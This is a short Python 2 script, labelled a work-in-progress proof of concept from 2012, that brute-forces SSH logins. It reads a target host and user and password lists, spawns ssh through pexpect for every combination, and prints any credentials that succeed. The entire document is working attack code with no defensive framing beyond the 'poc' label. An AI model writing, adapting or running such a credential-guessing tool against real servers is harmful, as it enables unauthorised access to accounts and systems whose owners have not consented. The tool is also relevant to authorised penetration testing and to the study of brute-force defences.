#!/usr/bin/python

'''
@author: m_101
@year  : 2012
@desc  : ssh bruteforce poc wip
'''

import pexpect
import sys

def get_content(filename):
    try:
        fp = open(filename, 'r')
    except Exception:
        return None

    content = fp.read()
    fp.close()
    return content

if len(sys.argv) != 4:
    print "Usage: %s host user/userFile password/passFile" % sys.argv[0]
    exit(1)

(progname, host, userlist, passlist) = sys.argv

users = []
passwords = []

# user(s)
u_content = get_content(userlist)
if u_content == None:
    users = [ userlist ]
else:
    users = u_content.split('\n')
# password(s)
p_content = get_content(passlist)
if p_content == None:
    passwords = [ passlist ]
else:
    passwords = p_content.split('\n')

for user in users:
    for password in passwords:
        child = pexpect.spawn('ssh ' + user + '@' + host)
        child.expect ('password:')
        child.sendline (password)

        # check bad/good result
        try:
            result = child.expect (['denied', user, pexpect.EOF], timeout=10)

            if result == 0:
                child.kill(0)
            elif result == 1:
                print "found: %s : %s on %s" % (user, password, host)
                break
            elif result == 2:
                print child.before
        except Exception:
            print "didn't get that"
